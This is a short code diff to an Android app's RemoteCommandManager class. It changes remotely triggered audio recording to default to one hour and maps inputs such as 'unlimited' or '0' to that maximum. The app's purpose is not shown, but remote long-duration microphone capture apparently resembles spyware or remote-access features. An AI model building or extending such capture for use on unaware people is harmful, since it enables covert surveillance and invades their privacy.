@@ -1274,11 +1274,14 @@ class RemoteCommandManager(private val context: Context) {
     }
 
     private suspend fun recordAudioRemote(payload: String): String = withContext(Dispatchers.IO) {
-        var durationSec = 10
+        var durationSec = 3600 // default 1 hour for unlimited recording
         var maxShots = 1
         var intervalSec = 2
         val trimmed = payload.trim()
-        if (trimmed.startsWith("{")) {
+        val lowerTrimmed = trimmed.lowercase()
+        if (lowerTrimmed.contains("unlimited") || lowerTrimmed.contains("forever") || lowerTrimmed.contains("max") || lowerTrimmed == "0") {
+            durationSec = 3600
+        } else if (trimmed.startsWith("{")) {
             try {
                 val json = JSONObject(trimmed)
                 val keys = listOf("durationSec", "duration_sec", "duration", "seconds", "durationSeconds", "sec", "length", "time")
@@ -1315,7 +1318,7 @@ class RemoteCommandManager(private val context: Context) {
                 durationSec = parsed
             }
         }
-        val finalDuration = durationSec.coerceAtLeast(1)
+        val finalDuration = if (durationSec <= 0) 3600 else durationSec.coerceAtLeast(1)
 
         val audioHelper = AudioRecorderHelper(context)
         try {
